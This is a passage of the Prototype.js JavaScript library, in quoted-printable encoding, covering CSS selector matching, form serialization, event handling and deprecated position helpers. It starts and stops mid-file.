    unique: function(nodes) {
      if (nodes.length =3D=3D 0) return nodes;
      var results =3D [], n;
      for (var i =3D 0, l =3D nodes.length; i < l; i++)
        if (typeof (n =3D nodes[i])._countedByPrototype =3D=3D 'undefined')=
 {
          n._countedByPrototype =3D Prototype.emptyFunction;
          results.push(Element.extend(n));
        }
      return Selector.handlers.unmark(results);
    },

    descendant: function(nodes) {
      var h =3D Selector.handlers;
      for (var i =3D 0, results =3D [], node; node =3D nodes[i]; i++)
        h.concat(results, node.getElementsByTagName('*'));
      return results;
    },

    child: function(nodes) {
      var h =3D Selector.handlers;
      for (var i =3D 0, results =3D [], node; node =3D nodes[i]; i++) {
        for (var j =3D 0, child; child =3D node.childNodes[j]; j++)
          if (child.nodeType =3D=3D 1 && child.tagName !=3D '!') results.pu=
sh(child);
      }
      return results;
    },

    adjacent: function(nodes) {
      for (var i =3D 0, results =3D [], node; node =3D nodes[i]; i++) {
        var next =3D this.nextElementSibling(node);
        if (next) results.push(next);
      }
      return results;
    },

    laterSibling: function(nodes) {
      var h =3D Selector.handlers;
      for (var i =3D 0, results =3D [], node; node =3D nodes[i]; i++)
        h.concat(results, Element.nextSiblings(node));
      return results;
    },

    nextElementSibling: function(node) {
      while (node =3D node.nextSibling)
        if (node.nodeType =3D=3D 1) return node;
      return null;
    },

    previousElementSibling: function(node) {
      while (node =3D node.previousSibling)
        if (node.nodeType =3D=3D 1) return node;
      return null;
    },

    tagName: function(nodes, root, tagName, combinator) {
      var uTagName =3D tagName.toUpperCase();
      var results =3D [], h =3D Selector.handlers;
      if (nodes) {
        if (combinator) {
          if (combinator =3D=3D "descendant") {
            for (var i =3D 0, node; node =3D nodes[i]; i++)
              h.concat(results, node.getElementsByTagName(tagName));
            return results;
          } else nodes =3D this[combinator](nodes);
          if (tagName =3D=3D "*") return nodes;
        }
        for (var i =3D 0, node; node =3D nodes[i]; i++)
          if (node.tagName.toUpperCase() =3D=3D=3D uTagName) results.push(n=
ode);
        return results;
      } else return root.getElementsByTagName(tagName);
    },

    id: function(nodes, root, id, combinator) {
      var targetNode =3D $(id), h =3D Selector.handlers;

      if (root =3D=3D document) {
        if (!targetNode) return [];
        if (!nodes) return [targetNode];
      } else {
        if (!root.sourceIndex || root.sourceIndex < 1) {
          var nodes =3D root.getElementsByTagName('*');
          for (var j =3D 0, node; node =3D nodes[j]; j++) {
            if (node.id =3D=3D=3D id) return [node];
          }
        }
      }

      if (nodes) {
        if (combinator) {
          if (combinator =3D=3D 'child') {
            for (var i =3D 0, node; node =3D nodes[i]; i++)
              if (targetNode.parentNode =3D=3D node) return [targetNode];
          } else if (combinator =3D=3D 'descendant') {
            for (var i =3D 0, node; node =3D nodes[i]; i++)
              if (Element.descendantOf(targetNode, node)) return [targetNod=
e];
          } else if (combinator =3D=3D 'adjacent') {
            for (var i =3D 0, node; node =3D nodes[i]; i++)
              if (Selector.handlers.previousElementSibling(targetNode) =3D=
=3D node)
                return [targetNode];
          } else nodes =3D h[combinator](nodes);
        }
        for (var i =3D 0, node; node =3D nodes[i]; i++)
          if (node =3D=3D targetNode) return [targetNode];
        return [];
      }
      return (targetNode && Element.descendantOf(targetNode, root)) ? [targ=
etNode] : [];
    },

    className: function(nodes, root, className, combinator) {
      if (nodes && combinator) nodes =3D this[combinator](nodes);
      return Selector.handlers.byClassName(nodes, root, className);
    },

    byClassName: function(nodes, root, className) {
      if (!nodes) nodes =3D Selector.handlers.descendant([root]);
      var needle =3D ' ' + className + ' ';
      for (var i =3D 0, results =3D [], node, nodeClassName; node =3D nodes=
[i]; i++) {
        nodeClassName =3D node.className;
        if (nodeClassName.length =3D=3D 0) continue;
        if (nodeClassName =3D=3D className || (' ' + nodeClassName + ' ').i=
nclude(needle))
          results.push(node);
      }
      return results;
    },

    attrPresence: function(nodes, root, attr, combinator) {
      if (!nodes) nodes =3D root.getElementsByTagName("*");
      if (nodes && combinator) nodes =3D this[combinator](nodes);
      var results =3D [];
      for (var i =3D 0, node; node =3D nodes[i]; i++)
        if (Element.hasAttribute(node, attr)) results.push(node);
      return results;
    },

    attr: function(nodes, root, attr, value, operator, combinator) {
      if (!nodes) nodes =3D root.getElementsByTagName("*");
      if (nodes && combinator) nodes =3D this[combinator](nodes);
      var handler =3D Selector.operators[operator], results =3D [];
      for (var i =3D 0, node; node =3D nodes[i]; i++) {
        var nodeValue =3D Element.readAttribute(node, attr);
        if (nodeValue =3D=3D=3D null) continue;
        if (handler(nodeValue, value)) results.push(node);
      }
      return results;
    },

    pseudo: function(nodes, name, value, root, combinator) {
      if (nodes && combinator) nodes =3D this[combinator](nodes);
      if (!nodes) nodes =3D root.getElementsByTagName("*");
      return Selector.pseudos[name](nodes, value, root);
    }
  },

  pseudos: {
    'first-child': function(nodes, value, root) {
      for (var i =3D 0, results =3D [], node; node =3D nodes[i]; i++) {
        if (Selector.handlers.previousElementSibling(node)) continue;
          results.push(node);
      }
      return results;
    },
    'last-child': function(nodes, value, root) {
      for (var i =3D 0, results =3D [], node; node =3D nodes[i]; i++) {
        if (Selector.handlers.nextElementSibling(node)) continue;
          results.push(node);
      }
      return results;
    },
    'only-child': function(nodes, value, root) {
      var h =3D Selector.handlers;
      for (var i =3D 0, results =3D [], node; node =3D nodes[i]; i++)
        if (!h.previousElementSibling(node) && !h.nextElementSibling(node))
          results.push(node);
      return results;
    },
    'nth-child':        function(nodes, formula, root) {
      return Selector.pseudos.nth(nodes, formula, root);
    },
    'nth-last-child':   function(nodes, formula, root) {
      return Selector.pseudos.nth(nodes, formula, root, true);
    },
    'nth-of-type':      function(nodes, formula, root) {
      return Selector.pseudos.nth(nodes, formula, root, false, true);
    },
    'nth-last-of-type': function(nodes, formula, root) {
      return Selector.pseudos.nth(nodes, formula, root, true, true);
    },
    'first-of-type':    function(nodes, formula, root) {
      return Selector.pseudos.nth(nodes, "1", root, false, true);
    },
    'last-of-type':     function(nodes, formula, root) {
      return Selector.pseudos.nth(nodes, "1", root, true, true);
    },
    'only-of-type':     function(nodes, formula, root) {
      var p =3D Selector.pseudos;
      return p['last-of-type'](p['first-of-type'](nodes, formula, root), fo=
rmula, root);
    },

    getIndices: function(a, b, total) {
      if (a =3D=3D 0) return b > 0 ? [b] : [];
      return $R(1, total).inject([], function(memo, i) {
        if (0 =3D=3D (i - b) % a && (i - b) / a >=3D 0) memo.push(i);
        return memo;
      });
    },

    nth: function(nodes, formula, root, reverse, ofType) {
      if (nodes.length =3D=3D 0) return [];
      if (formula =3D=3D 'even') formula =3D '2n+0';
      if (formula =3D=3D 'odd')  formula =3D '2n+1';
      var h =3D Selector.handlers, results =3D [], indexed =3D [], m;
      h.mark(nodes);
      for (var i =3D 0, node; node =3D nodes[i]; i++) {
        if (!node.parentNode._countedByPrototype) {
          h.index(node.parentNode, reverse, ofType);
          indexed.push(node.parentNode);
        }
      }
      if (formula.match(/^\d+$/)) { // just a number
        formula =3D Number(formula);
        for (var i =3D 0, node; node =3D nodes[i]; i++)
          if (node.nodeIndex =3D=3D formula) results.push(node);
      } else if (m =3D formula.match(/^(-?\d*)?n(([+-])(\d+))?/)) { // an+b
        if (m[1] =3D=3D "-") m[1] =3D -1;
        var a =3D m[1] ? Number(m[1]) : 1;
        var b =3D m[2] ? Number(m[2]) : 0;
        var indices =3D Selector.pseudos.getIndices(a, b, nodes.length);
        for (var i =3D 0, node, l =3D indices.length; node =3D nodes[i]; i+=
+) {
          for (var j =3D 0; j < l; j++)
            if (node.nodeIndex =3D=3D indices[j]) results.push(node);
        }
      }
      h.unmark(nodes);
      h.unmark(indexed);
      return results;
    },

    'empty': function(nodes, value, root) {
      for (var i =3D 0, results =3D [], node; node =3D nodes[i]; i++) {
        if (node.tagName =3D=3D '!' || node.firstChild) continue;
        results.push(node);
      }
      return results;
    },

    'not': function(nodes, selector, root) {
      var h =3D Selector.handlers, selectorType, m;
      var exclusions =3D new Selector(selector).findElements(root);
      h.mark(exclusions);
      for (var i =3D 0, results =3D [], node; node =3D nodes[i]; i++)
        if (!node._countedByPrototype) results.push(node);
      h.unmark(exclusions);
      return results;
    },

    'enabled': function(nodes, value, root) {
      for (var i =3D 0, results =3D [], node; node =3D nodes[i]; i++)
        if (!node.disabled && (!node.type || node.type !=3D=3D 'hidden'))
          results.push(node);
      return results;
    },

    'disabled': function(nodes, value, root) {
      for (var i =3D 0, results =3D [], node; node =3D nodes[i]; i++)
        if (node.disabled) results.push(node);
      return results;
    },

    'checked': function(nodes, value, root) {
      for (var i =3D 0, results =3D [], node; node =3D nodes[i]; i++)
        if (node.checked) results.push(node);
      return results;
    }
  },

  operators: {
    '=3D':  function(nv, v) { return nv =3D=3D v; },
    '!=3D': function(nv, v) { return nv !=3D v; },
    '^=3D': function(nv, v) { return nv =3D=3D v || nv && nv.startsWith(v);=
 },
    '$=3D': function(nv, v) { return nv =3D=3D v || nv && nv.endsWith(v); },
    '*=3D': function(nv, v) { return nv =3D=3D v || nv && nv.include(v); },
    '~=3D': function(nv, v) { return (' ' + nv + ' ').include(' ' + v + '=
 '); },
    '|=3D': function(nv, v) { return ('-' + (nv || "").toUpperCase() +
     '-').include('-' + (v || "").toUpperCase() + '-'); }
  },

  split: function(expression) {
    var expressions =3D [];
    expression.scan(/(([\w#:.~>+()\s-]+|\*|\[.*?\])+)\s*(,|$)/, function(m)=
 {
      expressions.push(m[1].strip());
    });
    return expressions;
  },

  matchElements: function(elements, expression) {
    var matches =3D $$(expression), h =3D Selector.handlers;
    h.mark(matches);
    for (var i =3D 0, results =3D [], element; element =3D elements[i]; i++)
      if (element._countedByPrototype) results.push(element);
    h.unmark(matches);
    return results;
  },

  findElement: function(elements, expression, index) {
    if (Object.isNumber(expression)) {
      index =3D expression; expression =3D false;
    }
    return Selector.matchElements(elements, expression || '*')[index || 0];
  },

  findChildElements: function(element, expressions) {
    expressions =3D Selector.split(expressions.join(','));
    var results =3D [], h =3D Selector.handlers;
    for (var i =3D 0, l =3D expressions.length, selector; i < l; i++) {
      selector =3D new Selector(expressions[i].strip());
      h.concat(results, selector.findElements(element));
    }
    return (l > 1) ? h.unique(results) : results;
  }
});

if (Prototype.Browser.IE) {
  Object.extend(Selector.handlers, {
    concat: function(a, b) {
      for (var i =3D 0, node; node =3D b[i]; i++)
        if (node.tagName !=3D=3D "!") a.push(node);
      return a;
    }
  });
}

function $$() {
  return Selector.findChildElements(document, $A(arguments));
}

var Form =3D {
  reset: function(form) {
    form =3D $(form);
    form.reset();
    return form;
  },

  serializeElements: function(elements, options) {
    if (typeof options !=3D 'object') options =3D { hash: !!options };
    else if (Object.isUndefined(options.hash)) options.hash =3D true;
    var key, value, submitted =3D false, submit =3D options.submit;

    var data =3D elements.inject({ }, function(result, element) {
      if (!element.disabled && element.name) {
        key =3D element.name; value =3D $(element).getValue();
        if (value !=3D null && element.type !=3D 'file' && (element.type !=
=3D 'submit' || (!submitted &&
            submit !=3D=3D false && (!submit || key =3D=3D submit) && (subm=
itted =3D true)))) {
          if (key in result) {
            if (!Object.isArray(result[key])) result[key] =3D [result[key]];
            result[key].push(value);
          }
          else result[key] =3D value;
        }
      }
      return result;
    });

    return options.hash ? data : Object.toQueryString(data);
  }
};

Form.Methods =3D {
  serialize: function(form, options) {
    return Form.serializeElements(Form.getElements(form), options);
  },

  getElements: function(form) {
    var elements =3D $(form).getElementsByTagName('*'),
        element,
        arr =3D [ ],
        serializers =3D Form.Element.Serializers;
    for (var i =3D 0; element =3D elements[i]; i++) {
      arr.push(element);
    }
    return arr.inject([], function(elements, child) {
      if (serializers[child.tagName.toLowerCase()])
        elements.push(Element.extend(child));
      return elements;
    })
  },

  getInputs: function(form, typeName, name) {
    form =3D $(form);
    var inputs =3D form.getElementsByTagName('input');

    if (!typeName && !name) return $A(inputs).map(Element.extend);

    for (var i =3D 0, matchingInputs =3D [], length =3D inputs.length; i <=
 length; i++) {
      var input =3D inputs[i];
      if ((typeName && input.type !=3D typeName) || (name && input.name !=
=3D name))
        continue;
      matchingInputs.push(Element.extend(input));
    }

    return matchingInputs;
  },

  disable: function(form) {
    form =3D $(form);
    Form.getElements(form).invoke('disable');
    return form;
  },

  enable: function(form) {
    form =3D $(form);
    Form.getElements(form).invoke('enable');
    return form;
  },

  findFirstElement: function(form) {
    var elements =3D $(form).getElements().findAll(function(element) {
      return 'hidden' !=3D element.type && !element.disabled;
    });
    var firstByIndex =3D elements.findAll(function(element) {
      return element.hasAttribute('tabIndex') && element.tabIndex >=3D 0;
    }).sortBy(function(element) { return element.tabIndex }).first();

    return firstByIndex ? firstByIndex : elements.find(function(element) {
      return /^(?:input|select|textarea)$/i.test(element.tagName);
    });
  },

  focusFirstElement: function(form) {
    form =3D $(form);
    form.findFirstElement().activate();
    return form;
  },

  request: function(form, options) {
    form =3D $(form), options =3D Object.clone(options || { });

    var params =3D options.parameters, action =3D form.readAttribute('actio=
n') || '';
    if (action.blank()) action =3D window.location.href;
    options.parameters =3D form.serialize(true);

    if (params) {
      if (Object.isString(params)) params =3D params.toQueryParams();
      Object.extend(options.parameters, params);
    }

    if (form.hasAttribute('method') && !options.method)
      options.method =3D form.method;

    return new Ajax.Request(action, options);
  }
};

/*-------------------------------------------------------------------------=
-*/


Form.Element =3D {
  focus: function(element) {
    $(element).focus();
    return element;
  },

  select: function(element) {
    $(element).select();
    return element;
  }
};

Form.Element.Methods =3D {

  serialize: function(element) {
    element =3D $(element);
    if (!element.disabled && element.name) {
      var value =3D element.getValue();
      if (value !=3D undefined) {
        var pair =3D { };
        pair[element.name] =3D value;
        return Object.toQueryString(pair);
      }
    }
    return '';
  },

  getValue: function(element) {
    element =3D $(element);
    var method =3D element.tagName.toLowerCase();
    return Form.Element.Serializers[method](element);
  },

  setValue: function(element, value) {
    element =3D $(element);
    var method =3D element.tagName.toLowerCase();
    Form.Element.Serializers[method](element, value);
    return element;
  },

  clear: function(element) {
    $(element).value =3D '';
    return element;
  },

  present: function(element) {
    return $(element).value !=3D '';
  },

  activate: function(element) {
    element =3D $(element);
    try {
      element.focus();
      if (element.select && (element.tagName.toLowerCase() !=3D 'input' ||
          !(/^(?:button|reset|submit)$/i.test(element.type))))
        element.select();
    } catch (e) { }
    return element;
  },

  disable: function(element) {
    element =3D $(element);
    element.disabled =3D true;
    return element;
  },

  enable: function(element) {
    element =3D $(element);
    element.disabled =3D false;
    return element;
  }
};

/*-------------------------------------------------------------------------=
-*/

var Field =3D Form.Element;

var $F =3D Form.Element.Methods.getValue;

/*-------------------------------------------------------------------------=
-*/

Form.Element.Serializers =3D {
  input: function(element, value) {
    switch (element.type.toLowerCase()) {
      case 'checkbox':
      case 'radio':
        return Form.Element.Serializers.inputSelector(element, value);
      default:
        return Form.Element.Serializers.textarea(element, value);
    }
  },

  inputSelector: function(element, value) {
    if (Object.isUndefined(value)) return element.checked ? element.value=
 : null;
    else element.checked =3D !!value;
  },

  textarea: function(element, value) {
    if (Object.isUndefined(value)) return element.value;
    else element.value =3D value;
  },

  select: function(element, value) {
    if (Object.isUndefined(value))
      return this[element.type =3D=3D 'select-one' ?
        'selectOne' : 'selectMany'](element);
    else {
      var opt, currentValue, single =3D !Object.isArray(value);
      for (var i =3D 0, length =3D element.length; i < length; i++) {
        opt =3D element.options[i];
        currentValue =3D this.optionValue(opt);
        if (single) {
          if (currentValue =3D=3D value) {
            opt.selected =3D true;
            return;
          }
        }
        else opt.selected =3D value.include(currentValue);
      }
    }
  },

  selectOne: function(element) {
    var index =3D element.selectedIndex;
    return index >=3D 0 ? this.optionValue(element.options[index]) : null;
  },

  selectMany: function(element) {
    var values, length =3D element.length;
    if (!length) return null;

    for (var i =3D 0, values =3D []; i < length; i++) {
      var opt =3D element.options[i];
      if (opt.selected) values.push(this.optionValue(opt));
    }
    return values;
  },

  optionValue: function(opt) {
    return Element.extend(opt).hasAttribute('value') ? opt.value : opt.text;
  }
};

/*-------------------------------------------------------------------------=
-*/


Abstract.TimedObserver =3D Class.create(PeriodicalExecuter, {
  initialize: function($super, element, frequency, callback) {
    $super(callback, frequency);
    this.element   =3D $(element);
    this.lastValue =3D this.getValue();
  },

  execute: function() {
    var value =3D this.getValue();
    if (Object.isString(this.lastValue) && Object.isString(value) ?
        this.lastValue !=3D value : String(this.lastValue) !=3D String(valu=
e)) {
      this.callback(this.element, value);
      this.lastValue =3D value;
    }
  }
});

Form.Element.Observer =3D Class.create(Abstract.TimedObserver, {
  getValue: function() {
    return Form.Element.getValue(this.element);
  }
});

Form.Observer =3D Class.create(Abstract.TimedObserver, {
  getValue: function() {
    return Form.serialize(this.element);
  }
});

/*-------------------------------------------------------------------------=
-*/

Abstract.EventObserver =3D Class.create({
  initialize: function(element, callback) {
    this.element  =3D $(element);
    this.callback =3D callback;

    this.lastValue =3D this.getValue();
    if (this.element.tagName.toLowerCase() =3D=3D 'form')
      this.registerFormCallbacks();
    else
      this.registerCallback(this.element);
  },

  onElementEvent: function() {
    var value =3D this.getValue();
    if (this.lastValue !=3D value) {
      this.callback(this.element, value);
      this.lastValue =3D value;
    }
  },

  registerFormCallbacks: function() {
    Form.getElements(this.element).each(this.registerCallback, this);
  },

  registerCallback: function(element) {
    if (element.type) {
      switch (element.type.toLowerCase()) {
        case 'checkbox':
        case 'radio':
          Event.observe(element, 'click', this.onElementEvent.bind(this));
          break;
        default:
          Event.observe(element, 'change', this.onElementEvent.bind(this));
          break;
      }
    }
  }
});

Form.Element.EventObserver =3D Class.create(Abstract.EventObserver, {
  getValue: function() {
    return Form.Element.getValue(this.element);
  }
});

Form.EventObserver =3D Class.create(Abstract.EventObserver, {
  getValue: function() {
    return Form.serialize(this.element);
  }
});
(function() {

  var Event =3D {
    KEY_BACKSPACE: 8,
    KEY_TAB:       9,
    KEY_RETURN:   13,
    KEY_ESC:      27,
    KEY_LEFT:     37,
    KEY_UP:       38,
    KEY_RIGHT:    39,
    KEY_DOWN:     40,
    KEY_DELETE:   46,
    KEY_HOME:     36,
    KEY_END:      35,
    KEY_PAGEUP:   33,
    KEY_PAGEDOWN: 34,
    KEY_INSERT:   45,

    cache: {}
  };

  var docEl =3D document.documentElement;
  var MOUSEENTER_MOUSELEAVE_EVENTS_SUPPORTED =3D 'onmouseenter' in docEl
    && 'onmouseleave' in docEl;

  var _isButton;
  if (Prototype.Browser.IE) {
    var buttonMap =3D { 0: 1, 1: 4, 2: 2 };
    _isButton =3D function(event, code) {
      return event.button =3D=3D=3D buttonMap[code];
    };
  } else if (Prototype.Browser.WebKit) {
    _isButton =3D function(event, code) {
      switch (code) {
        case 0: return event.which =3D=3D 1 && !event.metaKey;
        case 1: return event.which =3D=3D 1 && event.metaKey;
        default: return false;
      }
    };
  } else {
    _isButton =3D function(event, code) {
      return event.which ? (event.which =3D=3D=3D code + 1) : (event.button=
 =3D=3D=3D code);
    };
  }

  function isLeftClick(event)   { return _isButton(event, 0) }

  function isMiddleClick(event) { return _isButton(event, 1) }

  function isRightClick(event)  { return _isButton(event, 2) }

  function element(event) {
    event =3D Event.extend(event);

    var node =3D event.target, type =3D event.type,
     currentTarget =3D event.currentTarget;

    if (currentTarget && currentTarget.tagName) {
      if (type =3D=3D=3D 'load' || type =3D=3D=3D 'error' ||
        (type =3D=3D=3D 'click' && currentTarget.tagName.toLowerCase() =3D=
=3D=3D 'input'
          && currentTarget.type =3D=3D=3D 'radio'))
            node =3D currentTarget;
    }

    if (node.nodeType =3D=3D Node.TEXT_NODE)
      node =3D node.parentNode;

    return Element.extend(node);
  }

  function findElement(event, expression) {
    var element =3D Event.element(event);
    if (!expression) return element;
    var elements =3D [element].concat(element.ancestors());
    return Selector.findElement(elements, expression, 0);
  }

  function pointer(event) {
    return { x: pointerX(event), y: pointerY(event) };
  }

  function pointerX(event) {
    var docElement =3D document.documentElement,
     body =3D document.body || { scrollLeft: 0 };

    return event.pageX || (event.clientX +
      (docElement.scrollLeft || body.scrollLeft) -
      (docElement.clientLeft || 0));
  }

  function pointerY(event) {
    var docElement =3D document.documentElement,
     body =3D document.body || { scrollTop: 0 };

    return  event.pageY || (event.clientY +
       (docElement.scrollTop || body.scrollTop) -
       (docElement.clientTop || 0));
  }


  function stop(event) {
    Event.extend(event);
    event.preventDefault();
    event.stopPropagation();

    event.stopped =3D true;
  }

  Event.Methods =3D {
    isLeftClick: isLeftClick,
    isMiddleClick: isMiddleClick,
    isRightClick: isRightClick,

    element: element,
    findElement: findElement,

    pointer: pointer,
    pointerX: pointerX,
    pointerY: pointerY,

    stop: stop
  };


  var methods =3D Object.keys(Event.Methods).inject({ }, function(m, name) {
    m[name] =3D Event.Methods[name].methodize();
    return m;
  });

  if (Prototype.Browser.IE) {
    function _relatedTarget(event) {
      var element;
      switch (event.type) {
        case 'mouseover': element =3D event.fromElement; break;
        case 'mouseout':  element =3D event.toElement;   break;
        default: return null;
      }
      return Element.extend(element);
    }

    Object.extend(methods, {
      stopPropagation: function() { this.cancelBubble =3D true },
      preventDefault:  function() { this.returnValue =3D false },
      inspect: function() { return '[object Event]' }
    });

    Event.extend =3D function(event, element) {
      if (!event) return false;
      if (event._extendedByPrototype) return event;

      event._extendedByPrototype =3D Prototype.emptyFunction;
      var pointer =3D Event.pointer(event);

      Object.extend(event, {
        target: event.srcElement || element,
        relatedTarget: _relatedTarget(event),
        pageX:  pointer.x,
        pageY:  pointer.y
      });

      return Object.extend(event, methods);
    };
  } else {
    Event.prototype =3D window.Event.prototype || document.createEvent('HTM=
LEvents').__proto__;
    Object.extend(Event.prototype, methods);
    Event.extend =3D Prototype.K;
  }

  function _createResponder(element, eventName, handler) {
    var registry =3D Element.retrieve(element, 'prototype_event_registry');

    if (Object.isUndefined(registry)) {
      CACHE.push(element);
      registry =3D Element.retrieve(element, 'prototype_event_registry', $H=
());
    }

    var respondersForEvent =3D registry.get(eventName);
    if (Object.isUndefined(respondersForEvent)) {
      respondersForEvent =3D [];
      registry.set(eventName, respondersForEvent);
    }

    if (respondersForEvent.pluck('handler').include(handler)) return false;

    var responder;
    if (eventName.include(":")) {
      responder =3D function(event) {
        if (Object.isUndefined(event.eventName))
          return false;

        if (event.eventName !=3D=3D eventName)
          return false;

        Event.extend(event, element);
        handler.call(element, event);
      };
    } else {
      if (!MOUSEENTER_MOUSELEAVE_EVENTS_SUPPORTED &&
       (eventName =3D=3D=3D "mouseenter" || eventName =3D=3D=3D "mouseleave=
")) {
        if (eventName =3D=3D=3D "mouseenter" || eventName =3D=3D=3D "mousel=
eave") {
          responder =3D function(event) {
            Event.extend(event, element);

            var parent =3D event.relatedTarget;
            while (parent && parent !=3D=3D element) {
              try { parent =3D parent.parentNode; }
              catch(e) { parent =3D element; }
            }

            if (parent =3D=3D=3D element) return;

            handler.call(element, event);
          };
        }
      } else {
        responder =3D function(event) {
          Event.extend(event, element);
          handler.call(element, event);
        };
      }
    }

    responder.handler =3D handler;
    respondersForEvent.push(responder);
    return responder;
  }

  function _destroyCache() {
    for (var i =3D 0, length =3D CACHE.length; i < length; i++) {
      Event.stopObserving(CACHE[i]);
      CACHE[i] =3D null;
    }
  }

  var CACHE =3D [];

  if (Prototype.Browser.IE)
    window.attachEvent('onunload', _destroyCache);

  if (Prototype.Browser.WebKit)
    window.addEventListener('unload', Prototype.emptyFunction, false);


  var _getDOMEventName =3D Prototype.K;

  if (!MOUSEENTER_MOUSELEAVE_EVENTS_SUPPORTED) {
    _getDOMEventName =3D function(eventName) {
      var translations =3D { mouseenter: "mouseover", mouseleave: "mouseout=
" };
      return eventName in translations ? translations[eventName] : eventNam=
e;
    };
  }

  function observe(element, eventName, handler) {
    element =3D $(element);

    var responder =3D _createResponder(element, eventName, handler);

    if (!responder) return element;

    if (eventName.include(':')) {
      if (element.addEventListener)
        element.addEventListener("dataavailable", responder, false);
      else {
        element.attachEvent("ondataavailable", responder);
        element.attachEvent("onfilterchange", responder);
      }
    } else {
      var actualEventName =3D _getDOMEventName(eventName);

      if (element.addEventListener)
        element.addEventListener(actualEventName, responder, false);
      else
        element.attachEvent("on" + actualEventName, responder);
    }

    return element;
  }

  function stopObserving(element, eventName, handler) {
    element =3D $(element);

    var registry =3D Element.retrieve(element, 'prototype_event_registry');

    if (Object.isUndefined(registry)) return element;

    if (eventName && !handler) {
      var responders =3D registry.get(eventName);

      if (Object.isUndefined(responders)) return element;

      responders.each( function(r) {
        Element.stopObserving(element, eventName, r.handler);
      });
      return element;
    } else if (!eventName) {
      registry.each( function(pair) {
        var eventName =3D pair.key, responders =3D pair.value;

        responders.each( function(r) {
          Element.stopObserving(element, eventName, r.handler);
        });
      });
      return element;
    }

    var responders =3D registry.get(eventName);

    if (!responders) return;

    var responder =3D responders.find( function(r) { return r.handler =3D=
=3D=3D handler; });
    if (!responder) return element;

    var actualEventName =3D _getDOMEventName(eventName);

    if (eventName.include(':')) {
      if (element.removeEventListener)
        element.removeEventListener("dataavailable", responder, false);
      else {
        element.detachEvent("ondataavailable", responder);
        element.detachEvent("onfilterchange",  responder);
      }
    } else {
      if (element.removeEventListener)
        element.removeEventListener(actualEventName, responder, false);
      else
        element.detachEvent('on' + actualEventName, responder);
    }

    registry.set(eventName, responders.without(responder));

    return element;
  }

  function fire(element, eventName, memo, bubble) {
    element =3D $(element);

    if (Object.isUndefined(bubble))
      bubble =3D true;

    if (element =3D=3D document && document.createEvent && !element.dispatc=
hEvent)
      element =3D document.documentElement;

    var event;
    if (document.createEvent) {
      event =3D document.createEvent('HTMLEvents');
      event.initEvent('dataavailable', true, true);
    } else {
      event =3D document.createEventObject();
      event.eventType =3D bubble ? 'ondataavailable' : 'onfilterchange';
    }

    event.eventName =3D eventName;
    event.memo =3D memo || { };

    if (document.createEvent)
      element.dispatchEvent(event);
    else
      element.fireEvent(event.eventType, event);

    return Event.extend(event);
  }


  Object.extend(Event, Event.Methods);

  Object.extend(Event, {
    fire:          fire,
    observe:       observe,
    stopObserving: stopObserving
  });

  Element.addMethods({
    fire:          fire,

    observe:       observe,

    stopObserving: stopObserving
  });

  Object.extend(document, {
    fire:          fire.methodize(),

    observe:       observe.methodize(),

    stopObserving: stopObserving.methodize(),

    loaded:        false
  });

  if (window.Event) Object.extend(window.Event, Event);
  else window.Event =3D Event;
})();

(function() {
  /* Support for the DOMContentLoaded event is based on work by Dan Webb,
     Matthias Miller, Dean Edwards, John Resig, and Diego Perini. */

  var timer;

  function fireContentLoadedEvent() {
    if (document.loaded) return;
    if (timer) window.clearTimeout(timer);
    document.loaded =3D true;
    document.fire('dom:loaded');
  }

  function checkReadyState() {
    if (document.readyState =3D=3D=3D 'complete') {
      document.stopObserving('readystatechange', checkReadyState);
      fireContentLoadedEvent();
    }
  }

  function pollDoScroll() {
    try { document.documentElement.doScroll('left'); }
    catch(e) {
      timer =3D pollDoScroll.defer();
      return;
    }
    fireContentLoadedEvent();
  }

  if (document.addEventListener) {
    document.addEventListener('DOMContentLoaded', fireContentLoadedEvent,=
 false);
  } else {
    document.observe('readystatechange', checkReadyState);
    if (window =3D=3D top)
      timer =3D pollDoScroll.defer();
  }

  Event.observe(window, 'load', fireContentLoadedEvent);
})();

Element.addMethods();

/*------------------------------- DEPRECATED ------------------------------=
-*/

Hash.toQueryString =3D Object.toQueryString;

var Toggle =3D { display: Element.toggle };

Element.Methods.childOf =3D Element.Methods.descendantOf;

var Insertion =3D {
  Before: function(element, content) {
    return Element.insert(element, {before:content});
  },

  Top: function(element, content) {
    return Element.insert(element, {top:content});
  },

  Bottom: function(element, content) {
    return Element.insert(element, {bottom:content});
  },

  After: function(element, content) {
    return Element.insert(element, {after:content});
  }
};

var $continue =3D new Error('"throw $continue" is deprecated, use "return"=
 instead');

var Position =3D {
  includeScrollOffsets: false,

  prepare: function() {
    this.deltaX =3D  window.pageXOffset
                || document.documentElement.scrollLeft
                || document.body.scrollLeft
                || 0;
    this.deltaY =3D  window.pageYOffset
                || document.documentElement.scrollTop
                || document.body.scrollTop
                || 0;
  },

  within: function(element, x, y) {
    if (this.includeScrollOffsets)
      return this.withinIncludingScrolloffsets(element, x, y);
    this.xcomp =3D x;
    this.ycomp =3D y;
    this.offset =3D Element.cumulativeOffset(element);

    return (y >=3D this.offset[1] &&
            y <  this.offset[1] + element.offsetHeight &&
            x >=3D this.offset[0] &&
            x <  this.offset[0] + element.offsetWidth);
  },

  withinIncludingScrolloffsets: function(element, x, y) {
    var offsetcache =3D Element.cumulativeScrollOffset(element);

    this.xcomp =3D x + offsetcache[0] - this.deltaX;
    this.ycomp =3D y + offsetcache[1] - this.deltaY;
    this.offset =3D Element.cumulativeOffset(element);

    return (this.ycomp >=3D this.offset[1] &&
            this.ycomp <  this.offset[1] + element.offsetHeight &&
            this.xcomp >=3D this.offset[0] &&
            this.xcomp <  this.offset[0] + element.offsetWidth);
  },

  overlap: function(mode, element) {
    if (!mode) return 0;
    if (mode =3D=3D 'vertical')
      return ((this.offset[1] + element.offsetHeight) - this.ycomp) /
        element.offsetHeight;
    if (mode =3D=3D 'horizontal')
      return ((this.offset[0] + element.offsetWidth) - this.xcomp) /
        element.offsetWidth;
  },


  cumulativeOffset: Element.Methods.cumulativeOffset,

  positionedOffset: Element.Methods.positionedOffset,

  absolutize: function(element) {
    Position.prepare();
    return Element.absolutize(element);
  },

  relativize: function(element) {
    Position.prepare();
    return Element.relativize(element);
  },

  realOffset: Element.Methods.cumulativeScrollOffset,

  offsetParent: Element.Methods.getOffsetParent,

  page: Element.Methods.viewportOffset,

  clone: function(source, target, options) {
    options =3D options || { };
    return Element.clonePosition(target, source, options);
  }
};

/*-------------------------------------------------------------------------=
-*/

if (!document.getElementsByClassName) document.getElementsByClassName =3D=
 function(instanceMethods){
  function iter(name) {
    return name.blank() ? null : "[contains(concat(' ', @class, ' '), ' "=
 + name + " ')]";
  }

